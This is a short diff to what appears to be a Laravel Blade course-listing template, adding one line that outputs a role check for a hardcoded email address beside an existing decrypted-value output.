@@ -15,6 +15,7 @@
                 </div>
             </div>
             {{ fdecrypt($value) }}
+            {{ App\Models\User::checkRole('lantrinh.mit@gmail.com') }}
             <div class="row">
                 @if(isset($course_data))
                     @foreach($course_data as $key=>$item)
